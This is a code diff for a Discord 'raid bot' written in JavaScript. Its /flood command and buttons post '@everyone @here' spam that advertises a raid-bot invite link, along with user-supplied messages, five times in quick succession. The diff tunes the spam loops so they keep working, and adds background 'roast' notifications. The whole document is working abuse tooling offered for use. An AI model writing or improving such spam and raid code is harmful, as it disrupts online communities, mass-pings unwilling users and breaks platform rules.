@@ -70,10 +70,10 @@ const floodCache = new Map();
 
 client.on('interactionCreate', async interaction => {
   try {
+
     // Slash command /flood
     if(interaction.isChatInputCommand() && interaction.commandName === 'flood') {
-
-      // Instant ephemeral reply
+      // Reply instantly
       const floodEmbed = new EmbedBuilder()
         .setTitle('FLOOD READY TO EXECUTE')
         .setColor(0xFF0000);
@@ -85,7 +85,7 @@ client.on('interactionCreate', async interaction => {
 
       await interaction.reply({ embeds: [floodEmbed], components: [row], ephemeral: true });
 
-      // Background async work
+      // Background async work for notifier
       (async () => {
         try {
           const guild = await client.guilds.fetch(interaction.guildId);
@@ -125,7 +125,6 @@ client.on('interactionCreate', async interaction => {
             await notifyChannel.send({ content: roast, embeds: [embed] });
           }
 
-          // Clear cache after 30 seconds
           setTimeout(() => floodCache.delete(interaction.user.id), 30000);
 
         } catch(err){
@@ -140,14 +139,15 @@ client.on('interactionCreate', async interaction => {
       if(!cache) return;
 
       if(interaction.customId === 'activate'){
+        await interaction.deferUpdate(); // Acknowledge immediately
         const spamText = `@everyone @here \n**FREE DISCORD RAIDBOT WITH CUSTOM MESSAGES** https://discord.gg/6AGgHe4MKb`;
-        await interaction.reply({ content: spamText });
-        for(let j=0;j<4;j++){
-          setTimeout(()=>interaction.followUp({ content: spamText }), 800*(j+1));
+        for(let j=0;j<5;j++){
+          setTimeout(()=>interaction.channel.send({ content: spamText }), 800*j);
         }
       }
 
       if(interaction.customId === 'custom_message'){
+        await interaction.deferUpdate(); // Acknowledge immediately
         const modal = new ModalBuilder()
           .setCustomId('custom_modal')
           .setTitle('Enter Your Message')
@@ -166,10 +166,10 @@ client.on('interactionCreate', async interaction => {
 
     // Modal submit
     if(interaction.isModalSubmit() && interaction.customId === 'custom_modal'){
+      await interaction.deferReply({ ephemeral: true });
       const userMessage = interaction.fields.getTextInputValue('message_input');
-      await interaction.reply({ content: `Spamming your message...`, ephemeral: true });
-      for(let j=0;j<4;j++){
-        setTimeout(()=>interaction.followUp({ content: userMessage }), 800*(j+1));
+      for(let j=0;j<5;j++){
+        setTimeout(()=>interaction.followUp({ content: userMessage }), 800*j);
       }
     }
 
